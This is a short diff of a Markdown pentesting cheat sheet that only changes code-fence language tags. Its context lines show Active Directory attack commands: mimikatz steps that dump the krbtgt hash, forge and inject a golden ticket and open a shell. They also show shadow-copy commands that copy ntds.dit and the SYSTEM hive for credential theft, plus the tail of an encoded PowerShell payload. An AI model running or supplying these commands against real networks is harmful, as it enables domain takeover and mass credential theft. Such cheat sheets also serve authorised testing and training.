@@ -1943,7 +1578,7 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 
 1. Get the krbtgt hash
 
-```powershell
+```sh
 .\mimikatz.exe
 privilege::debug
 #below are some ways
@@ -1961,7 +1596,7 @@ kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698
 
 1. Obtaining access!
 
-```powershell
+```sh
 mimikatz.exe #no need for highest privileges
 kerberos::ptt golden
 misc::cmd #we're accessing cmd
@@ -1969,7 +1604,7 @@ misc::cmd #we're accessing cmd
 
 ### Shadow Copies
 
-```powershell
+```sh
 vshadow.exe -nw -p C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
 reg.exe save hklm\system c:\system.bak
